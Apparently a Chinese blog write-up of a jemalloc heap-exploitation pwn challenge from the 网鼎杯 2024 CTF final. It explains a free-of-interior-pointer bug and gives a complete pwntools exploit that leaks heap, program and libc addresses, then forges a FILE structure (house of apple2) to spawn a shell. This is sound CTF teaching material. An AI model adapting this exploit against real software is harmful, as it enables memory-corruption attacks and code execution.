---
date: 2024-12-17 10:29:05
layout: post
title: every fold reveals a side
subtitle: 网鼎杯 2024 final writeup
description: >-
    jemalloc play ~
image: >-
  /assets/img/uploads/autumn_cat.jpg
optimized_image: >-
  /assets/img/uploads/autumn_cat.jpg
category: ctf
tags:
  - jemalloc
  - wdb
  - pwn
  - heap exploitation
author: rosayxy
paginate: true
---
唉，最近在家效率低到炸裂，沉迷各种言情小说（在现实世界里得不到的爱情只能从书中看了（流泪）），于是写博客督促自己不要过于摸鱼     
下面进入正题,附件见 [这里](/attachments/every-fold-reveals-a-side.zip)     

## 整体情况
这个题的特殊之处是他并没有用常规的 ptmalloc 而是用的 jemalloc，所以堆构造就完全不同了，然后看了之前的几个 jemalloc 相关的 writeup 感觉好像漏洞点也和本文的不同，所以就只能边打边摸索了     
## 漏洞点
在 switch-case 的 case6 处有一个 free 堆块内地址
```c
if ( !final_struct )
  exit(-1);
free((void *)(final_struct + v3[choice]));
*(_QWORD *)(final_struct + v3[choice]) = 0LL;
```
这种情况在 ptmalloc 里面大概率会 crash 掉，但是在 jemalloc 中则不会，于是写了以下序列来观察：
```py
fold(231)
uninstall()
fold(123)
```
发现 free 的堆块是 malloc 0x68_base + 0x10 然后再次 fold 的时候申请出来 0x68 的堆块也是和 free 地址相同，都是 0x68_base + 0x10，于是就类似于一个堆重叠原语    
之后一开始还不太清楚怎么用，只能 leak 一个堆地址，卡了一会看到可以来回切换 fold 的形态，并且如果之前申请过的话就会用原本的结构体来做后续操作，所以就大概知道怎么用这个堆重叠了     
最终相当于是有一个任意地址写 + 任意地址读原语，然后打 house of apple2 就行      
## exp
```py
from pwn import*
context(log_level="debug", arch="amd64", os="linux")
p=process("./pwn")
libc = ELF("./libc.so.6")
def fold(num):
    p.recvuntil("Enter your choice > ")
    p.sendline("1")
    p.recvuntil("Which direction?\n")
    p.sendline(str(num))

def edit(content):
    p.recvuntil("Enter your choice > ")
    p.sendline("2")
    p.recvuntil("Enter memo content > ")
    p.send(content)

def read():
    p.recvuntil("Enter your choice > ")
    p.sendline("3")

def delete():
    p.recvuntil("Enter your choice > ")
    p.sendline("4")

def play():
    p.recvuntil("Enter your choice > ")
    p.sendline("5")

def uninstall():
    p.recvuntil("Enter your choice > ")
    p.sendline("6")
    
def get_basic_info():
    p.recvuntil("Enter your choice > ")
    p.sendline("7")

def edit_basic_info(content):
    p.recvuntil("Enter your choice > ")
    p.sendline("8")
    p.recvuntil("Enter memo content > ")
    p.send(content)
    
# 下一次从被 free 的地址开始申请
# one gadget 0x583dc 0x583e3 0xef4ce 0xef52b
fold(231)
uninstall()
fold(123)
get_basic_info()
p.recvuntil("Basic info:\n")
p.recv(0x30)

heap_leak = u64(p.recv(6).ljust(8,b"\x00"))
# 0x7fca45625000 0x7fca45d93000
print(hex(heap_leak))
# edit pointer 123 的 0x18 的位置是 funcptr 的堆块
# leak proc
edit_basic_info(p64(0)*5+p64(0x100)+p64(heap_leak - 0x1000+0x10))
fold(231)
read()
p.recvuntil("Memo content:\n")
proc_leak = u64(p.recv(6).ljust(8,b"\x00"))
proc_base = proc_leak - 0x15bd
print(hex(proc_base))
# leak libc
fold(123)
edit_basic_info(p64(0)*5+p64(0x100)+p64(proc_base + 0x3f88))
fold(231)

read()
p.recvuntil("Memo content:\n")
libc_leak = u64(p.recv(6).ljust(8,b"\x00"))
libc_base = libc_leak - libc.sym["puts"]
print(hex(libc_base))
# arbituary address write
fold(123)
edit_basic_info(p64(0)*5+p64(0x100)+p64(heap_leak + 0x1000))
fold(231)
io_list_all = libc_base + 0x2044C0
system_addr = libc_base + libc.sym["system"]
heap_addr = heap_leak + 0x1000
fake_io_file=b"  sh;".ljust(0x8,b"\x00") 
fake_io_file+=p64(0)*3+p64(1)+p64(2)
fake_io_file=fake_io_file.ljust(0x68,b"\x00")
fake_io_file+=p64(system_addr)
fake_io_file = fake_io_file.ljust(0x88,b"\x00")
fake_io_file+=p64(heap_addr+0xe8)
fake_io_file=fake_io_file.ljust(0xa0,b"\x00")
fake_io_file+=p64(heap_addr)
fake_io_file=fake_io_file.ljust(0xd8,b"\x00")
fake_io_file+=p64(0x202228+libc_base)
fake_io_file+=p64(heap_addr)
fake_io_file += p64(0)+p64(heap_addr+0xe8)
edit(fake_io_file)
fold(123)
edit_basic_info(p64(0)*5+p64(0x100)+p64(io_list_all))
fold(231)
edit(p64(heap_addr))
fold(111)
p.interactive()

```